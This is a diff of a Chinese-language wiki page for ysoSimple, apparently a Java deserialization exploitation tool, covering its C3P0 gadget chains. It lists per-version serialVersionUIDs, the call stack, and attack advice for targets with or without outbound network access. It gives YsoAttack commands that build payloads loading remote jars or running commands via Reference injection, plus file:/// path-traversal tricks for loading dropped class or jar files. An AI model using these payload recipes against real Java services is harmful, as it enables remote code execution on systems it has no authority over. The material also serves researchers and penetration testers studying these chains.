@@ -682,7 +682,7 @@ C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打�
 
 * Jndi 注入：C3P01 生成序列化流比较复杂目前未集成
 * URLCLassLoader 远程类加载：C3P02，C3P02_c3p0
-* 不出网的Reference注入：C3P03，C3P03_c3p0
+* Reference注入：C3P03，C3P03_c3p0
 
 另外网上存在两种C3P0依赖，com.mchange:c3p0、c3p0:c3p0。两个C3P0都能够利用但是俩者的SUID不同。
 
@@ -690,10 +690,59 @@ C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打�
 | --------------- | ---------------- | --------------------------- | ------------------------------- |
 | C3P02           | com.mchange:c3p0 | -2440162180985815128L<br /> | 6594570032105297376L            |
 | C3P02_c3p0      | c3p0:c3p0        | 7387108436934414104L<br />  | 5807565096136484351L            |
+|                 |                  |                             |                                 |
 
-#### C3P02 远程类加载
+突然发现 c3p0:c3p0 老旧版本的PoolBackedDataSource suid和新版还不一样，先不写利用链了后面遇到再写。后面打算作为参数搞
 
-描述：打一次后因为类已经被加载到内存中，所以如果要切换漏洞利用效果需要重新设定类名和Jar包名
+```
+c3p0:c3p0 PoolBackedDataSource 
+0.8.5.2: -7540256409981171067
+0.8.4.5: 2134623495585503200
+0.9.0: 1L
+0.9.0.2: 1L
+0.9.0.4: 1L
+```
+
+URLCLassLoader 远程类加载和 Reference注入的调用栈都是下面这样的：
+
+```java
+com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()
+ -IndirectlySerialized#getObject()
+ -com.mchange.v2.naming.ReferenceIndirector#getObject()
+   -com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)
+```
+
+上面说过两种C3P0依赖suid不一样，俩个依赖在ReferenceableUtils#referenceToObject处的代码也是不一样的
+
+- c3p0:c3p0 中的ReferenceableUtils#referenceToObject：URLClassLoader 指定URL进行类加载，上层类加载器为系统类加载器SystemClassLoader
+
+![image-20251105143140601](ysoSimple-Wiki.assets/image-20251105143140601.png)
+
+- com.mchange:c3p0 中的ReferenceableUtils#referenceToObject：URLClassLoader 指定URL进行类加载，上层类加载器为线程上下文类加载器
+
+![image-20251105143113575](ysoSimple-Wiki.assets/image-20251105143113575.png)
+
+- 实战利用中如果目标出网更推荐使用C3P02远程类加载方式进行利用。
+- 如果目标不出网且存在依赖是 com.mchange:c3p0，推荐使用不出网Reference注入攻击。
+- 如果目标不出网且存在依赖是 c3p0:c3p0，先通过其他方式写class或者jar然后再通过URLClassLoader类嵌套file:///协议来加载该class或者jar文件。
+
+关于URLClassLoader类加载的小技巧，对于file协议来说它加载的不一定要是.class和.jar文件。也可以是目录也可以是其他后缀名，具体看下面的记录：
+
+```python
+落地文件内容是jar包情况
+lcation = "file:///../../../../../../../../../../../../tmp/"; //文件名后缀是jar不可以加载字节码类成功，文件名后缀是tmp不可以加载字节码类成功
+lcation = "file:///../../../../../../../../../../../../tmp/T32448485776400.jar"; //可以加载字节码类成功
+lcation = "file:///../../../../../../../../../../../../tmp/T32448485776400.tmp"; //可以加载字节码类成功
+
+落地文件内容是class文件情况
+lcation = "file:///../../../../../../../../../../../../tmp/"; //文件名后缀是class可以加载字节码类成功，文件名后缀是tmp不可以加载字节码类成功
+lcation = "file:///../../../../../../../../../../../../tmp/T31147297087600.class"; //可以加载字节码类成功
+lcation = "file:///../../../../../../../../../../../../tmp/T31147297087600.tmp"; //不可以加载字节码类成功
+```
+
+#### C3P02 URLClassLoader类加载
+
+描述：远程类加载漏洞利用链的调用栈和下面Reference注入的调用栈都是一样的，只是漏洞利用手法不一样。使用该漏洞利用链打一次后因为类已经被加载到内存中，所以如果要切换漏洞利用效果需要重新设定类名和Jar包名。
 
 工具：使用方式如下：
 
@@ -704,11 +753,15 @@ C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打�
 # c3p0:c3p0
 -m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/T32150077959500.jar|T32150077959500"
 -m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/EncryptionUtil.jar|ch.qos.logback.qd.EncryptionUtil"
+-m YsoAttack -g C3P02_c3p0 -a ""
 ```
 
-#### C3P03 不出网Reference注入
+#### C3P03 Reference注入
 
-描述：C3P0利用链可以不出网利用，关于利用链的构造可以学习yulegeyu师傅的[JAVA反序列化之C3P0不出网利用](https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)文章。所以做漏洞利用的时候可引用JNDIAttack模块的Reference本地工厂类。而因为JNDIAttack模块有些Refernce工厂类漏洞利用又是出网的(如:Snakeyaml)，所以实际攻防时还需要注意构造合适的args参数
+描述：C3P0利用链可以不出网Reference注入利用，关于利用链的构造可以学习yulegeyu师傅的[JAVA反序列化之C3P0不出网利用](https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)文章。  
+
+- 对于 com.mchange:c3p0来说ReferenceableUtils#referenceToObject 是用 URLClassLoader + Thread.currentThread().getContextClassLoader() 来进行Reference类加载，所以目标依赖是com.mchange:c3p0这个利用Reference注入多数情况下可以利用成功。c3p0:c3p0 使用 URLClassLoader+ SystemClassLoader 来Reference类加载，所以目标c3p0:c3p0这时候用Reference注入不一定成功。
+- 漏洞利用的时候可引用JNDIAttack模块的Reference本地工厂类。而因为JNDIAttack模块有些Refernce工厂类漏洞利用又是出网的(如:Snakeyaml)，所以实际攻防时还需要注意构造合适的args参数
 
 工具：使用方式如下：参数直接写Reference打法的路由。注意Refernce的最后路径利用参数需要Base64编码，否则生成Payload会有问题。
 
@@ -718,26 +771,10 @@ C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打�
 -m YsoAttack -g C3P03 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
 -m YsoAttack -g C3P03 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
 
-# c3p0:c3p0
+# c3p0:c3p0 不一定成功
 -m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/calc"
 -m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
 -m YsoAttack -g C3P03_c3p0 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
-```
-
-ReferenceableUtils#referenceToObject 在不同的C3P0版本对ObjectFactory使用的类加载器不同
-
-使用URLClassLoader而不是线程上下文的情况
-
-```
-文件内容是jar包情况
-lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\"; //文件名后缀是jar不可以加载字节码类成功，文件名后缀是tmp不可以加载字节码类成功
-lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T32448485776400.jar"; //可以加载字节码类成功
-lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T32448485776400.tmp"; //可以加载字节码类成功
-
-文件内容是class文件情况
-lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\"; //文件名后缀是class可以加载字节码类成功，文件名后缀是tmp不可以加载字节码类成功
-lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T31147297087600.class"; //可以加载字节码类成功
-lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T31147297087600.tmp"; //不可以加载字节码类成功
 ```
 
 ### FileUpload1
